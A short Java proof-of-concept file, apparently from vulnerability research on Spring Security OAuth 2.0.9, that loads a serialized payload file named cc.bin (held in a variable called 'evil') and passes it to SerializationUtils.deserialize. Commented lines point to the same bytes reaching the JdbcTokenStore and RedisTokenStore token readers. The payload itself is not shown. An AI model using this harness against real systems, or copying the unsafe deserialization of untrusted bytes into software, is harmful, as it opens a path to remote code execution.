package com.th.poc;

import org.springframework.security.oauth2.provider.token.store.JdbcTokenStore;
import org.springframework.security.oauth2.provider.token.store.redis.BaseRedisTokenStoreSerializationStrategy;
import org.springframework.security.oauth2.provider.token.store.redis.RedisTokenStore;
import org.springframework.util.SerializationUtils;

import javax.sql.DataSource;

/**
 * Created by cfchi on 2017/9/2.
 */
public class UnSerialTest {
    public static String openFileToString(byte[] _bytes)
    {
        String file_string = "";

        for(int i = 0; i < _bytes.length; i++)
        {
            file_string += (char)_bytes[i];
        }

        return file_string;
    }
    public static void main(String[] args) throws Exception{
        byte[] evil=FileUtils.toByteArray2("D:\\vul\\spring-security-oauth-2.0.9.RELEASE\\samples\\oauth2\\tonr\\src\\test\\java\\com\\th\\poc\\cc.bin");
        SerializationUtils.deserialize(evil);

        //DataSource ds=null;
        //JdbcTokenStore jts = new JdbcTokenStore(ds);
        //jts.deserializeRefreshToken(evil);

        //RedisTokenStore rts = new RedisTokenStore(null);
        //rts.readAccessToken(openFileToString(evil));
    }
}
